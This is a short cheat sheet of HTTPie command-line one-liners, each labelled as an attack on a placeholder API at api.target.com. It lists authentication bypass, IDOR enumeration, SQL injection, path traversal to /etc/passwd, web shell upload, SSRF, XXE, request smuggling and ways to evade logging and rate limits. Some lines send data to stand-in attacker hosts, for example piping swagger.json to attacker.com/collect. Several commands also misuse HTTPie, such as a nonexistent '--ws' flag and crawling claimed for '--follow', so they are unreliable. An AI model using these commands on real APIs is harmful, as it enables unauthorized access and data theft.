      HTTPie - Command-line HTTP client for API testing
        Map API endpoints using HTTPie's recursive crawling: `http --follow --timeout=2 GET api.target.com/v1/`
        Test authentication bypass by manipulating headers: `http GET api.target.com/v1/admin Authorization:'Basic invalid_token'`
        Perform API fuzzing with custom payloads: `http POST api.target.com/v1/users name=@payloads.txt --stream`
        Extract sensitive information through API parameter manipulation: `http GET api.target.com/v1/users id==* --print=HBhb`
        Test for IDOR vulnerabilities by iterating through IDs: `http GET api.target.com/v1/users/id/{1..1000}`
        Exploit API rate limiting by parallel requests: `http --session=./session.json GET api.target.com/v1/data`
        Test for SQL injection via API parameters: `http POST api.target.com/v1/search q="1' OR '1'='1"`
        Enumerate API versions and endpoints: `http OPTIONS api.target.com/`
        Chain API requests for complex attacks: `http --session=./session.json POST api.target.com/v1/auth < auth.json | http POST api.target.com/v1/admin`
        Exploit file upload endpoints: `http --form POST api.target.com/v1/upload file@shell.php`
        Analyze API response schemas: `http GET api.target.com/v1/schema --output=schema.json --verify=no`
        Test JWT token manipulation: `http GET api.target.com/v1/protected Authorization:"Bearer <modified_token>"`
        Exfiltrate data through custom headers: `http GET api.target.com/v1/data Custom-Header:@data.txt`
        Test for HTTP method override vulnerabilities: `http POST api.target.com/v1/users X-HTTP-Method-Override:PUT`
        Exploit GraphQL endpoints: `http POST api.target.com/graphql query=@graphql_payload.txt`
        Test for path traversal via API parameters: `http GET api.target.com/v1/files path='../../../etc/passwd'`
        Perform API response manipulation: `http POST api.target.com/v1/process Content-Type:application/xml < payload.xml`
        Test for API mass assignment: `http POST api.target.com/v1/users role=admin is_superuser=true`
        Execute automated API scanning: `for i in $(seq 1 100); do http GET api.target.com/v1/users/$i; done`
        Test for server-side request forgery: `http GET api.target.com/v1/proxy url=http://internal-server`
        Test CORS misconfiguration: `http OPTIONS api.target.com/v1/sensitive Origin:evil.com --print=h`
        Exploit API caching: `http GET api.target.com/v1/cache Cache-Control:no-store If-None-Match:"*"`
        Test batch operation vulnerabilities: `http POST api.target.com/v1/batch operations:='[{"method":"GET","path":"/admin"}]'`
        Trigger error messages for information disclosure: `http GET api.target.com/v1/debug --raw "{{malformed}}" --ignore-stdin`
        Test for API race conditions: `http --timeout=1 POST api.target.com/v1/transaction amount=100 & http POST api.target.com/v1/transaction amount=100`
        Exploit weak API versioning: `http GET api.target.com/v1/users Accept-Version:0.1`
        Test for API parameter pollution: `http GET "api.target.com/v1/search?q=test&q=<script>"`
        Exploit webhook endpoints: `http POST api.target.com/v1/webhooks url=http://attacker.com/collect`
        Test for XML external entity injection: `http POST api.target.com/v1/parse Content-Type:application/xml < xxe_payload.xml`
        Exploit API redirections: `http GET api.target.com/v1/redirect?url=http://evil.com --follow`
        Exploit Swagger/OpenAPI documentation: `http GET api.target.com/swagger.json | http POST attacker.com/collect`
        Test API key rotation bypass: `http GET api.target.com/v1/data --auth-type=apikey --auth='expired:key' If-Unmodified-Since:"<old_date>"`
        Exploit content type confusion: `http POST api.target.com/v1/upload Content-Type:image/jpeg < shell.php`
        Bypass API logging: `http GET api.target.com/v1/admin X-Forwarded-For:localhost User-Agent:healthcheck`
        Test WebSocket API endpoints: `http --ws ws://api.target.com/v1/stream message=@payload.json`
        Exploit API rate limiting with distributed requests: `http GET api.target.com/v1/data X-Forwarded-For:@ip_list.txt`
        Test for HTTP request smuggling: `http POST api.target.com/v1 Transfer-Encoding:chunked Content-Length:4`
        Exploit API response splitting: `http GET 'api.target.com/v1/echo?msg=data%0d%0aHTTP/1.1%20200%20OK'`
        Test for API endpoint parameter cloaking: `http GET "api.target.com/v1/users?id=%2561%2564%256d%2569%256e"`
        Exploit API debug endpoints: `http GET api.target.com/v1/debug/vars X-Debug-Mode:true`
